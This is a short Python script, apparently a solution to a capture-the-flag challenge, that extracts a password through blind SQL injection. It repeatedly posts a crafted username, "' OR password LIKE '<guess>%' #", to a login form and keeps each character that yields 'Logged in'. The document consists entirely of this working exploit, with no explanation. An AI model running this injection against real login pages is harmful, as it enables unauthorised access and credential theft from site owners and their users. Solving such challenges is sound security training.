import requests
url = "http://challs.houseplant.riceteacatpanda.wtf:30001/"
flag = ""
dict = "abecdsfghjklmnpqtuvxyzerio1234567890!@$^&*()+|}{:?><,./;'[]\=-"
while True:
	for i in dict:
		password = flag + i
		payload = "' OR password LIKE '" + password + "%' #"
		r = requests.post(url, data={'username': payload, 'password':'lol'})
		if "Logged in" in r.text:
			flag += i
			break
	print(flag)